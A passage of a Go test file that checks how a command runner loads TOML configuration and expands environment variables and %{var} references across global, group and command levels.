args = ["test"]
env = ["LONG=` + strings.Repeat("a", 1000) + `"]
`,
			expectVars: map[string]string{
				"LONG": strings.Repeat("a", 1000),
			},
		},
		{
			name: "many_variables",
			systemEnv: map[string]string{
				"S1": "s1", "S2": "s2", "S3": "s3",
			},
			configTOML: `
[global]
env = ["G1=g1", "G2=g2", "G3=g3"]
[[groups]]
name = "test_group"
env = ["GR1=gr1", "GR2=gr2", "GR3=gr3"]
[[groups.commands]]
name = "test"
cmd = "echo"
args = ["test"]
env = ["C1=c1", "C2=c2", "C3=c3"]
`,
			expectVars: map[string]string{
				"S1": "s1", "S2": "s2", "S3": "s3",
				"G1": "g1", "G2": "g2", "G3": "g3",
				"GR1": "gr1", "GR2": "gr2", "GR3": "gr3",
				"C1": "c1", "C2": "c2", "C3": "c3",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Set up system environment
			for k, v := range tt.systemEnv {
				t.Setenv(k, v)
			}

			// Create temporary config file
			tempDir := t.TempDir()
			configPath := filepath.Join(tempDir, "config.toml")
			if err := os.WriteFile(configPath, []byte(tt.configTOML), 0o644); err != nil {
				t.Fatalf("Failed to write config file: %v", err)
			}

			// Create hash directory
			hashDir := filepath.Join(tempDir, "hashes")
			if err := os.MkdirAll(hashDir, 0o700); err != nil {
				t.Fatalf("Failed to create hash directory: %v", err)
			}

			// Load and prepare config
			verificationManager, err := verification.NewManagerForTest(hashDir, verification.WithFileValidatorDisabled())
			if err != nil {
				t.Fatalf("Failed to create verification manager: %v", err)
			}

			cfg, err := bootstrap.LoadAndPrepareConfig(verificationManager, configPath, "test-run-env-priority")
			if err != nil {
				t.Fatalf("Failed to load config: %v", err)
			}

			// Extract the first command
			if len(cfg.Groups) == 0 || len(cfg.Groups[0].Commands) == 0 {
				t.Fatal("No command found in config")
			}
			cmd := &cfg.Groups[0].Commands[0]
			group := &cfg.Groups[0]

			// Build final environment map
			finalEnv := make(map[string]string)

			// Start with system env
			for k, v := range tt.systemEnv {
				finalEnv[k] = v
			}

			// Apply global env
			for k, v := range cfg.Global.ExpandedEnv {
				finalEnv[k] = v
			}

			// Apply group env
			for k, v := range group.ExpandedEnv {
				finalEnv[k] = v
			}

			// Apply command env
			for k, v := range cmd.ExpandedEnv {
				finalEnv[k] = v
			}

			// Verify expected variables
			for k, expectedVal := range tt.expectVars {
				actualVal, ok := finalEnv[k]
				if !ok {
					t.Errorf("Variable %s not found in final environment", k)
					continue
				}
				if actualVal != expectedVal {
					t.Errorf("Variable %s: expected %q, got %q", k, expectedVal, actualVal)
				}
			}
		})
	}
}

// TestRunner_ResolveEnvironmentVars_Integration tests the integration of variable resolution
func TestRunner_ResolveEnvironmentVars_Integration(t *testing.T) {
	systemEnv := map[string]string{
		"HOME": "/home/test",
		"USER": "testuser",
	}

	configTOML := `
[global]
from_env = ["HOME=HOME", "USER=USER"]
env_allowlist = ["HOME", "USER"]
vars = ["base=%{HOME}/app"]
env = ["APP_BASE=%{base}"]
[[groups]]
name = "test_group"
vars = ["rel_path=data", "data_dir=%{base}/%{rel_path}"]
env = ["DATA_DIR=%{data_dir}"]
[[groups.commands]]
name = "test"
cmd = "echo"
args = ["%{data_dir}"]
vars = ["filename=output.txt", "output=%{data_dir}/%{filename}"]
env = ["OUTPUT=%{output}"]
`

	// Set up system environment
	for k, v := range systemEnv {
		t.Setenv(k, v)
	}

	// Create temporary config file
	tempDir := t.TempDir()
	configPath := filepath.Join(tempDir, "config.toml")
	if err := os.WriteFile(configPath, []byte(configTOML), 0o644); err != nil {
		t.Fatalf("Failed to write config file: %v", err)
	}

	// Create hash directory
	hashDir := filepath.Join(tempDir, "hashes")
	if err := os.MkdirAll(hashDir, 0o700); err != nil {
		t.Fatalf("Failed to create hash directory: %v", err)
	}

	// Load and prepare config
	verificationManager, err := verification.NewManagerForTest(hashDir, verification.WithFileValidatorDisabled())
	if err != nil {
		t.Fatalf("Failed to create verification manager: %v", err)
	}

	cfg, err := bootstrap.LoadAndPrepareConfig(verificationManager, configPath, "test-run-env-priority")
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	// Extract the first command
	if len(cfg.Groups) == 0 || len(cfg.Groups[0].Commands) == 0 {
		t.Fatal("No command found in config")
	}
	cmd := &cfg.Groups[0].Commands[0]
	group := &cfg.Groups[0]

	// Verify vars expansion at each level
	if cfg.Global.ExpandedVars["base"] != "/home/test/app" {
		t.Errorf("Global vars: expected base=/home/test/app, got %q", cfg.Global.ExpandedVars["base"])
	}

	if group.ExpandedVars["rel_path"] != "data" {
		t.Errorf("Group vars: expected rel_path=data, got %q", group.ExpandedVars["rel_path"])
	}

	if group.ExpandedVars["data_dir"] != "/home/test/app/data" {
		t.Errorf("Group vars: expected data_dir=/home/test/app/data, got %q", group.ExpandedVars["data_dir"])
	}

	if cmd.ExpandedVars["filename"] != "output.txt" {
		t.Errorf("Command vars: expected filename=output.txt, got %q", cmd.ExpandedVars["filename"])
	}

	if cmd.ExpandedVars["output"] != "/home/test/app/data/output.txt" {
		t.Errorf("Command vars: expected output=/home/test/app/data/output.txt, got %q", cmd.ExpandedVars["output"])
	}

	// Verify env expansion
	if cfg.Global.ExpandedEnv["APP_BASE"] != "/home/test/app" {
		t.Errorf("Global env: expected APP_BASE=/home/test/app, got %q", cfg.Global.ExpandedEnv["APP_BASE"])
	}

	if group.ExpandedEnv["DATA_DIR"] != "/home/test/app/data" {
		t.Errorf("Group env: expected DATA_DIR=/home/test/app/data, got %q", group.ExpandedEnv["DATA_DIR"])
	}

	if cmd.ExpandedEnv["OUTPUT"] != "/home/test/app/data/output.txt" {
		t.Errorf("Command env: expected OUTPUT=/home/test/app/data/output.txt, got %q", cmd.ExpandedEnv["OUTPUT"])
	}

	// Verify command args expansion
	if len(cmd.ExpandedArgs) != 1 {
		t.Fatalf("Expected 1 arg, got %d", len(cmd.ExpandedArgs))
	}
	if cmd.ExpandedArgs[0] != "/home/test/app/data" {
		t.Errorf("Command args: expected /home/test/app/data, got %q", cmd.ExpandedArgs[0])
	}
}
